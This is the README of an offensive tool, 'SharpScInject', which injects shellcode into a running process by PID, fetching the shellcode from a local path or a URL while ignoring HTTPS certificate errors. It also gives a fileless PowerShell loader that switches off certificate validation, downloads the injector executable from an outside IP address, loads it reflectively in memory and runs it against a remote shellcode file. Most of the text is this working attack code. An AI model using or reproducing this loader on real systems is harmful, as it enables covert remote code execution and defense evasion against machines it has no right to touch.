# Sharp Shell Code Inject
Inject the shellcode from local file or remote.
The https certificate for the request is ignored.
(No need high priv!)

## Build
```
sudo apt install -y mono-complete
./build.sh
```

## Usage
```
SharpScInject.exe <PID> <Shell Code PATH / URL>
```


File-less invoke
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;
$data = (New-Object System.Net.WebClient).DownloadData('https://192.168.xx.xx/file/ProcInject.exe')
# $data=[System.IO.File]::ReadAllBytes('C:\Windows\Tasks\ProcInject.exe')

$argument = "5278 https://192.168.xx.xx/file/my_shellcode.bin"

$assem = [System.Reflection.Assembly]::Load($data)
$method = $assem.Entrypoint
$argu= New-Object -TypeName System.Collections.ArrayList
$strings = $argument.Split(" ")
$argu.Add($strings)
$method.Invoke($null, $argu.ToArray())
```
